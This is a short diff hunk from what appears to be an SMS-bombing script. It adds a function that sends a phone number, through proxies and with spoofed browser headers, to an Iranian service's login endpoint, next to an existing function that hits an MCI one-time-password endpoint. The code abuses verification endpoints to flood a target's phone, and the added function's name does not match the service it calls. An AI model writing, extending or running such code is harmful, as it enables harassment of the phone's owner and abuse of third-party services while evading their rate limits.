@@ -1321,7 +1321,12 @@ def mcishop(num, proxies):
     rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '1006ee1c-790c-45fa-a86d-ac36846b8e87','content-length': '23','content-type': 'application/json','origin': 'https://shop.mci.ir','referer': 'https://shop.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
     post(proxies=proxies, url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
 
-
+def snapmarket(num, proxies):
+    post(proxies=proxies, url="https://account.api.balad.ir/api/web/auth/login/",
+                json={
+                    "phone_number": f'0{num}',
+                    "os_type": "W"
+                },
 
 
 
